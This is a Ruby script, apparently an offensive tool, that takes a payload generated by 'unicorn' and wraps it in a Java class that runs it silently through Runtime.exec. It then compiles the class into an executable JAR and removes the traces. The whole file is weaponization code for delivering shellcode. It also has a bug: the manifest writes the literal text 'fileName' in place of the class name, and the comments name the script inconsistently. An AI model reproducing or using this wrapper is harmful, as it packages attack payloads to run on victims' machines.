#!/usr/bin/env ruby
#Use: unicorn2vba.rb unicornOutputFileHere
def usage
	puts "ruby unicorn2jar.rb unicornOutputFileHere jarFileNameHere" 
end
def parse (shellcode, fileName)
	#Strips out the \n char that unicorn adds at the end
	shellcode = shellcode.strip.gsub(/\s+/, ' ')
	#Building the .java one liner
	javaFile1 = 'import java.io.*;public class' + ' ' +fileName + '{public static void main(String args[]){try{Process p = Runtime.getRuntime().exec("' 
        javaFile2 = javaFile1 + shellcode + '");}catch(IOException e1){}}}'
	#Write the one liner to a file.Name.java
	File.open(fileName+".java", "w") do |f|     
		f.write(javaFile2)   
	end
	#Creates manifest file
	File.open("manifest.txt", "w") do |f|
		f.write('Main-Class: ' + 'fileName')
	end
	#Builds and executes command to compile .java into .class
	#Then it creates the jar file and cleans up
	exec ('javac ' + fileName + '.java&&jar -cvfm ' + fileName + '.jar manifest.txt ' + fileName + '.class&&rm -f '+ fileName + '.class ' + fileName + '.java manifest.txt')
end
if ARGV.empty?
	usage
else
	outputfile = File.open(ARGV[0]).read
	jarFileName = ARGV[1]
	parse(outputfile, jarFileName)
end
